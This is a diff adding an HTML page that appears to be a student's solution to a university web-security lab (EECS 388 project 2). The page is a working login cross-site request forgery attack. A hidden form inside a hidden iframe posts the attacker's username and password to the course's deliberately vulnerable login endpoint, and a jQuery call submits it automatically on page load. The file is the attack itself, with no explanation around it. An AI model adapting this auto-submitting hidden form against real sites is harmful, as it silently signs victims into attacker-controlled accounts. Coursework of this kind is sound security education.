@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<html>
+	<body>
+		<iframe name="frame" style="visibility:hidden;">
+		</iframe>
+		<form target="frame" id="form" style="visibility:hidden;" action="http://eecs388.org/project2/login?csrfdefense=0&xssdefense=4" method="post" class="form-inline">
+              <p>Log in or create an account.</p>
+              <div class="form-group form-space">
+                <input id="username" name="username" value="attacker" required="" class="form-control" type="text" >
+              </div>
+              <div class="form-group form-space">
+                <input id="userpass" name="password" value="l33th4x" required="" class="form-control" type="password">
+              </div>
+              <div class="form-group form-more-space">
+                <button id="log-in-btn" type="submit" formaction="./login" class="btn btn-default">Login</button>
+                <button id="new-account-btn" type="submit" formaction="./create" class="btn btn-default">Create Account</button>
+              </div>
+            </form>
+
+		<script type="text/javascript">
+			$("#form").submit();
+		</script>
+	</body>
+</html>
